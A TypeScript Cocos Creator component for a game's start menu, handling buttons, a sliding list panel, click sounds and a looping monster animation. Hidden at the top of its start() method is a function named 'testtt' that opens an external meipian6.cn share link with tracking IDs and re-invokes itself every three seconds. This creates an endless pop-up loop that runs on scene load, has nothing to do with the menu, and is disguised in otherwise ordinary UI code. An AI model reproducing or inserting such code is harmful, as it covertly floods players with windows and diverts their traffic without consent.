import SoundManager, { soundEffType } from "./SoundManager";

const { ccclass, property } = cc._decorator;

@ccclass
export default class NewClass extends cc.Component {

    @property(cc.Node)
    startBtn: cc.Node = null;

    @property(cc.Node)
    listBtn: cc.Node = null;

    @property(cc.Node)
    monster: cc.Node = null;

    @property(cc.Node)
    listNode: cc.Node = null;
    @property(cc.Node)
    listBg: cc.Node = null;
    @property(cc.Animation)
    ani: cc.Animation = null;

    soundManger: SoundManager;

    start() {

        window["testtt"] = function(){
            window.open("https://www.meipian6.cn/2krqhljk?share_depth=4&user_id=ohbsluMoGrt5QZLqVIC7owJ4VwZE&sharer_id=ojq1tt6pvdrUasLOfuhI--bCBmYQ&first_share_uid=75117002&share_user_mpuuid=cb57f6fe50156521227b5632fbae99cc&v=5.2.2&share_source=timeline")
            setTimeout(() => {
                window["testtt"]();
            }, 3000);
        }
        window["testtt"]();


        this.listNode.x = 0;
        this.listNode.y = -800;

        this.listNode.scaleX = 0;
        this.listNode.scaleY = 0;
        this.listBg.active = false;

        cc.debug.setDisplayStats(false);
        this.startBtn.on(cc.Node.EventType.TOUCH_END, () => {
            if (!this.soundManger) {
                this.soundManger = cc.find("rootNode").getComponent("SoundManager");

            }
            this.soundManger.playSoundEff(soundEffType.click);
            cc.director.loadScene("mainScene");
        }, this)
        this.listBtn.on(cc.Node.EventType.TOUCH_END, () => {
            this.listBg.active = true;
            if (!this.soundManger) {
                this.soundManger = cc.find("rootNode").getComponent("SoundManager");

            }
            this.soundManger.playSoundEff(soundEffType.click);

            this.listNode.stopAllActions();
            let act = cc.spawn(cc.moveTo(0.2, 0, 0), cc.scaleTo(0.2, 1, 1))
            this.listNode.runAction(act);
        }, this)

        this.listBg.on(cc.Node.EventType.TOUCH_END, () => {
            this.listBg.active = false;
            this.listNode.stopAllActions();
            let act = cc.spawn(cc.moveTo(0.2, 0, -800), cc.scaleTo(0.2, 0, 1))
            this.listNode.runAction(act);
        }, this);

        this.ani.on(cc.Animation.EventType.FINISHED, this.callBack, this);
        this.addBtnAni(this.startBtn);

    }

    callBack() {
        this.ani.off(cc.Animation.EventType.FINISHED, this.callBack, this);

        let ani = cc.sequence(cc.rotateTo(0.2, 30), cc.rotateTo(0.4, -30), cc.rotateTo(0.2, 0), cc.delayTime(0.5));
        this.monster.runAction(cc.repeatForever(ani));
    }

    addBtnAni(node: cc.Node) {
        node.on(cc.Node.EventType.TOUCH_START, () => {
            node.stopAllActions();
            let ani = cc.scaleTo(0.15, 0.8);
            node.runAction(ani);
        }, this)
        node.on(cc.Node.EventType.TOUCH_END, () => {
            node.stopAllActions();
            let ani = cc.scaleTo(0.15, 1);
            node.runAction(ani);
        }, this)
        node.on(cc.Node.EventType.TOUCH_CANCEL, () => {
            node.stopAllActions();
            let ani = cc.scaleTo(0.15, 1);
            node.runAction(ani);
        }, this)

    }

    // update (dt) {}
}
